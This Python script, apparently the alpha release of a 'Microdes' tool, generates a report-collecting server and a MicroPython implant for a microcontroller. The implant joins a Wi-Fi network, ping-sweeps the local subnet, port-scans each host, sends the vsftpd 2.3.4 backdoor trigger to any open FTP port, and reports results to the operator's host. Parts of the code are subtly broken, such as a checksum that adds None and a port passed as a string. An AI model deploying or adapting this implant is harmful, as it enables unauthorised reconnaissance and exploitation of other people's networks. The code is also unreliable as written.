import sys
import re

def main():
    counter = 0
    host = ""
    wifiaddress = ""
    wifipassword = ""

    for i in sys.argv:
        counter = counter + 1
        try:
            if(i=="-H"):
                host = str(sys.argv[counter])
                if (valid_ip(host)==False):
                    print("Wrong IP Address")

            if(i=="-wN"):
                wifiaddress = str(sys.argv[counter])
                
            if(i=="-wP"):
                wifipassword = str(sys.argv[counter])

            if(i=="-p"):
                hport = str(sys.argv[counter])

            if(i=="-h"):
                return usage()
        except:
            usage()
        

    create_server()
    create_client(host,hport,wifiaddress,wifipassword)


def valid_ip(address):
    try:
        host_bytes = address.split('.')
        valid = [int(b) for b in host_bytes]
        valid = [b for b in valid if b >= 0 and b<=255]
        return len(host_bytes) == 4 and len(valid) == 4
    except:
        return False


def create_server():
    createserver = """
import socketserver
import sys

addressbook = []

class MyTCPHandler(socketserver.BaseRequestHandler):
        
    def handle(self):
        self.data = self.request.recv(1024).strip()
        print ("{} wrote:".format(self.client_address[0]))
        
        data = self.data
        data = data.decode("utf-8")
        print(data)
        
        
def server():
    if __name__ == "__main__":
        HOST, PORT = "0.0.0.0", 3346
        server = socketserver.TCPServer((HOST, PORT), MyTCPHandler)
        server.serve_forever()
        
server()
"""
    f = open("server.py","w")
    f.write(createserver)
    f.close()

def create_client(host,hport,wifiaddress,wifipassword):
    createclient="""
import upip
import socket
import time
import sys
import utime
import uselect
import uctypes
import usocket
import ustruct
import urandom

try:
	import network
except:
	upip.install("network")
	import network

try:
    import usocket
except:
    upip.install("usocket")
    import usocket

online_ip=[]

report = {}

def checksum(data):
    if len(data) & 0x1: # Odd number of bytes
        data += None

    cs = 0
    for pos in range(0, len(data), 2):
        b1 = data[pos]
        b2 = data[pos + 1]
        cs += (b1 << 8) + b2
    while cs >= 0x10000:
        cs = (cs & 0xffff) + (cs >> 16)
    cs = ~cs & 0xffff
    return cs

def ping(host, count=4, timeout=5000, interval=10, quiet=False, size=64):

    # prepare packet
    assert size >= 16, "pkt size too small"
    pkt = b'Q'*size
    pkt_desc = {
        "type": uctypes.UINT8 | 0,
        "code": uctypes.UINT8 | 1,
        "checksum": uctypes.UINT16 | 2,
        "id": uctypes.UINT16 | 4,
        "seq": uctypes.INT16 | 6,
        "timestamp": uctypes.UINT64 | 8,
    } # packet header descriptor
    h = uctypes.struct(uctypes.addressof(pkt), pkt_desc, uctypes.BIG_ENDIAN)
    h.type = 8 # ICMP_ECHO_REQUEST
    h.code = 0
    h.checksum = 0
    h.id = urandom.randint(0, 65535)
    h.seq = 1

    # init socket
    sock = usocket.socket(usocket.AF_INET, usocket.SOCK_RAW, 1)
    sock.setblocking(0)
    sock.settimeout(timeout/1000)
    addr = usocket.getaddrinfo(host, 1)[0][-1][0] # ip address
    sock.connect((addr, 1))
    not quiet and print("PING %s (%s): %u data bytes" % (host, addr, len(pkt)))

    seqs = list(range(1, count+1)) # [1,2,...,count]
    c = 1
    t = 0
    n_trans = 0
    n_recv = 0
    finish = False
    while t < timeout:
        if t==interval and c<=count:
            # send packet
            h.checksum = 0
            h.seq = c
            h.timestamp = utime.ticks_us()
            h.checksum = checksum(pkt)
            if sock.send(pkt) == size:
                n_trans += 1
                t = 0 # reset timeout
            else:
                seqs.remove(c)
            c += 1

        # recv packet
        while 1:
            socks, _, _ = uselect.select([sock], [], [], 0)
            if socks:
                resp = socks[0].recv(4096)
                resp_mv = memoryview(resp)
                h2 = uctypes.struct(uctypes.addressof(resp_mv[20:]), pkt_desc, uctypes.BIG_ENDIAN)
                # TODO: validate checksum (optional)
                seq = h2.seq
                if h2.type==0 and h2.id==h.id and (seq in seqs): # 0: ICMP_ECHO_REPLY
                    t_elasped = (utime.ticks_us()-h2.timestamp) / 1000
                    ttl = ustruct.unpack('!B', resp_mv[8:9])[0] # time-to-live
                    n_recv += 1
                    not quiet and print("%u bytes from %s: icmp_seq=%u, ttl=%u, time=%f ms" % (len(resp), addr, seq, ttl, t_elasped))
                    seqs.remove(seq)
                    if len(seqs) == 0:
                        finish = True
                        break
            else:
                break

        if finish:
            break

        utime.sleep_ms(1)
        t += 1

    # close
    sock.close()
    ret = (n_trans, n_recv)
    not quiet and print("%u packets transmitted, %u packets received" % (n_trans, n_recv))
    return (n_trans, n_recv)


def ping_start():
    ip_array = []

    for a in range (2,255):
        ip_array.append("192.168.0.{}".format(a))
    
    iparr(ip_array)
    ip_array = []

def iparr(ip_array):
    for i in ip_array:
        if(ping(host='{}'.format(i), count=1, timeout=2000)[1] != 0):
            online_ip.append(i)


def portscan(ip,open_ports):
    for port in range(1,1000):  
        print(port)
        porttry(ip,port,open_ports)

    return 0

def porttry(ip, port,open_ports):
    try:
        sock = usocket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)

        result = sock.connect((ip, port))
        print(result)
        if (result == None):
            open_ports.append(port)
        sock.close()
    except:
        sock.close()
        return 0    

def vsftpd234(ip,report,port=21):

    try:
        ftp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ftp_socket.connect((ip, port))

        ftp_socket.send(b'USER letmein:)')
        ftp_socket.send(b'PASS please')
        time.sleep(2)
        ftp_socket.close()
        report[ip] = {"VSFTPD234":"True"}
        
    except Exception:
        print('[!] Failed to trigger backdoor')

def reporting(ip,open_ports):
    portreport(ip,open_ports)
    vulnreport(ip,open_ports)

def portreport(ip,open_ports):
    portlist = ""

    for port in open_ports:
        portlist += (str(port)+",")

    report[ip] = portlist
    reporter=str(report)
    send(reporter)

def vulnreport(ip,open_ports):
    report = {}
    for port in open_ports:
        if(port == 21):
            vsftpd234(ip,report,port)

    reporter=str(report)
    send(reporter)

"""
    createclient= createclient + """
def send(reporter):
    try:
        sock = usocket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect(("{}", "{}"))
        sock.send(reporter)
        sock.close()
    except:
        sock.close()
        return 0
""".format(host,hport)
    createclient= createclient + """
def main():
    open_ports=[]
    ping_start()
    for ip in online_ip:
        portscan(ip,open_ports)
        print(open_ports)
        reporting(ip,open_ports)
        open_ports = []

print("Attempting to Connect to WiFi")
try:
    wlan = network.WLAN(network.STA_IF) # create station interface
    wlan.active(True)       # activate the interface
    wlan.scan()             # scan for access points

    if (wlan.isconnected()==False):      # check if the station is connected to an AP
        wlan.connect("{}","{}") # connect to an AP
        time.sleep(15)

    wlan.config('mac')      # get the interface's MAC address

    wlan.ifconfig()         # get the interface's IP/netmask/gw/DNS addresses
            
    print("Getting Network Information")
            
    print("Successfuly connected")
    main()
except:
    print("Network Connection Failed")

""".format(wifiaddress,wifipassword)

    f = open("main.py","w")
    f.write(createclient)
    f.close

def usage():
    usagestr="""
microdes.py -H [server-ip] -p [server-port] -wN [Wireless Name] -wP [Wireless Password] \n
Run server.py on host \n
Upload main.py to microcontroller \n
Readme for deployment of micropython and debugging
    """
    print(usagestr)
    return 0

runstr= """
The Microdes tool \n
Created by Microdes Team \n
Github: https://github.com/orgs/microdes \n
GNU General Public License \n
Version: 0.0.1 Alpha \n
This is a limited usage release !!! \n
Wait for the initial release to see all capabilities \n
-h for help! \n
"""
print(runstr)

main()